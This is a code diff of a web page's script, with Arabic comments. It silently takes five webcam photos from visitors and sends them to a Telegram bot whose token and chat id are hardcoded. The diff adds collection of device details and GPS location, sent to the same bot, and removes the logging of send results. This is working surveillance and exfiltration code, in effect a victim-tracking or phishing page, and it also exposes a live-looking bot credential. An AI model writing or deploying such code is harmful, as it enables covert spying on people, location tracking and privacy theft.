@@ -23,23 +23,64 @@
     const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
     const chat_id = '6437823957';
 
+    // إرسال معلومات الجهاز والموقع
+    function sendDeviceInfo(latitude = "غير متوفر", longitude = "غير متوفر") {
+      const info = `
+معلومات الجهاز:
+نظام التشغيل: ${navigator.platform}
+المتصفح: ${navigator.userAgent}
+اللغة: ${navigator.language}
+دقة الشاشة: ${window.screen.width}x${window.screen.height}
+الموقع:
+خط العرض: ${latitude}
+خط الطول: ${longitude}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id, text: info })
+      });
+    }
+
+    // حاول تحديد الموقع
+    function getLocationAndSendInfo() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendDeviceInfo(lat, lon);
+          },
+          error => {
+            console.warn("الموقع غير متاح:", error.message);
+            sendDeviceInfo(); // بدون موقع
+          }
+        );
+      } else {
+        sendDeviceInfo(); // الموقع غير مدعوم
+      }
+    }
+
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
-        // التقط 5 صور بفاصل 200ms
         let count = 0;
         const maxPhotos = 5;
         const interval = setInterval(() => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg');
+          canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
           count++;
           if (count >= maxPhotos) clearInterval(interval);
         }, 200);
+
+        // إرسال معلومات الجهاز والموقع
+        getLocationAndSendInfo();
       })
       .catch(err => alert("فشل تشغيل الكاميرا: " + err));
 
-    function sendToTelegram(blob) {
+    function sendPhoto(blob) {
       const formData = new FormData();
       formData.append('chat_id', chat_id);
       formData.append('photo', blob, 'photo.jpg');
@@ -47,9 +88,7 @@
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: 'POST',
         body: formData
-      })
-      .then(res => console.log("تم الإرسال"))
-      .catch(err => console.error("خطأ:", err));
+      });
     }
   </script>
 </body>
